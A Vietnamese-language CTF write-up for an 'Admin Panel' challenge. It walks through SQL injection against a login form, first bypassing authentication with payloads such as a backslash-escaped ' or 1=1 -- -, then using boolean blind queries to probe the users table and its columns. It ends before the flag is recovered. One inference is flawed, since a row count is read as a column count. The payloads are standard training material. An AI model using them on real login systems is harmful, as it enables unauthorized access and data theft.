# Write up Admin Panel

Vào challenge thì nó cho một giao diện login như vậy

<img width="659" height="580" alt="image" src="https://github.com/user-attachments/assets/44e4e964-d6d3-4867-bcbe-071c3c6a11c6" />

Mình thử nhập vào username và password bất kì 

<img width="772" height="284" alt="image" src="https://github.com/user-attachments/assets/9089a78c-8676-412c-ab46-e4e7d0676bcd" />

Thì nó có hiện ra một trang web báo No user

Thử SQL injection 
```sql
username: ' or 1=1 -- -
password: 1234
```
<img width="704" height="158" alt="image" src="https://github.com/user-attachments/assets/7740cef1-dc3a-4f9c-886e-de749f51f6c2" />


```sql
username:\
password:) or 1=1-- -
```
<img width="1438" height="130" alt="image" src="https://github.com/user-attachments/assets/401a5fc8-6932-43e0-8b92-68aaafb3a235" />


nó báo lỗi syntax , vậy là SQLi ở đây được rồi , nhưng mà hình như trong cú pháp nó không sử dụng ngoặc tròn nên báo lỗi syntax , mình thử xóa ngoặc tròn đi
```sql
username:\
password: or 1=1-- -
```
<img width="750" height="276" alt="image" src="https://github.com/user-attachments/assets/c50e14e6-4090-42af-acb6-8c7ff2616d9d" />


Nhưng khi vào rồi , sau một hồi tìm kiếm thì mình không thấy Flag ở đâu cả. Khả năng flag nó không được lưu ở đâu trong đây cả. 

Mình nghĩ ngay đến việc dùng blind , nếu câu truy vấn có kết quả trả về thì luôn vào được admin panel , còn nếu không có thì nó sẽ báo no user

Đầu tiên xác định tên bảng , mình thử đoán coi tên bảng có phải là `users` hay không cho lẹ 
```sql
username:\
password: or (select count(*) from users)>0 -- -
```

<img width="1493" height="521" alt="image" src="https://github.com/user-attachments/assets/6d916be9-c2a0-43ea-a65d-e328057ffd03" />

Thì login được vào chứng tỏ ở đây bảng users tồn tại . Tiếp tục đoán tên cột là password và username có tồn tại trong bảng users hay không
```sql
or (select count(username) from users)>0-- -
```
<img width="1491" height="597" alt="image" src="https://github.com/user-attachments/assets/a952400e-dfa3-4a3b-8d66-f7bd2e7f1d92" />

Vẫn login vào được chứng tỏ tồn tại cột username. Đoán tiếp cột password
```sql
or (select count(password) from users)>0-- -
```
<img width="1491" height="629" alt="image" src="https://github.com/user-attachments/assets/4f379fa2-4907-487c-a637-9e8f630693b6" />

Login vào được chứng tỏ cột password tồn tại . Check tiếp thử xem coi còn có cột nào nữa hay không
```sql
or (select count(*) from users)=2 -- -
```
<img width="1492" height="750" alt="image" src="https://github.com/user-attachments/assets/2a84f6bc-c91b-4c21-bb89-4cd97df8f345" />

Và nó trả về login thành công vậy tức là chỉ có 2 cột trong bảng users

Tương tự , ở trong cột password xác định được có 2 dòng . Khả năng cao là có 1 dòng sẽ lưu flag 


<img width="1490" height="557" alt="image" src="https://github.com/user-attachments/assets/55e1fc64-7263-4bd5-ac58-a54a7b164c4c" />






